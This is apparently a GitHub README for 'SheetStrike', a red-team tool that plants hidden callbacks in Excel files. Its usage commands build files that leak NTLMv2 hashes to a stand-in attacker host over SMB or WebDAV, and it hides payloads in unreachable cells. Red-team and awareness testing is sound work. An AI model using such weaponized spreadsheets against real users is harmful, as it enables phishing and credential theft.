# ⚡ SheetStrike

Weaponize Excel files for red team operations and security assessments.

## Features

- **HTTP Canary** - Track document opens with stealth callbacks
- **SMB Hash Capture** - Harvest NTLMv2 hashes via UNC paths (LAN)
- **WebDAV Hash Capture** - Harvest hashes over HTTP/HTTPS
- **Stealth Injection** - Payloads hidden in unreachable cells with legitimate-looking resource names

## Quick Start
```bash
# HTTP tracking
python3 sheetstrike.py -i clean.xlsx -o tracked.xlsx -m http -H yourserver.com

# SMB hash capture
python3 sheetstrike.py -i clean.xlsx -o evil.xlsx -m smb -H 192.168.1.100

# WebDAV (remote hash capture)
python3 sheetstrike.py -i clean.xlsx -o evil.xlsx -m webdav -H attacker.com --https
```

## Use Cases

- Red team engagements
- Phishing simulations
- Security awareness testing
- Detecting document leaks

⚠️ **For authorized security testing only**

<img width="892" height="537" alt="immagine" src="https://github.com/user-attachments/assets/6384a792-5f48-470c-a485-5c273da2ce86" />
---
<img width="658" height="279" alt="immagine" src="https://github.com/user-attachments/assets/92788c36-12a2-45fa-86d5-a43822d76ff4" />
---
<img width="695" height="509" alt="immagine" src="https://github.com/user-attachments/assets/850c181c-acf5-4bfb-be88-ad73385dbd61" />
---
<img width="754" height="136" alt="immagine" src="https://github.com/user-attachments/assets/674f3fe0-cd38-48a3-bdad-6b40362031b9" />


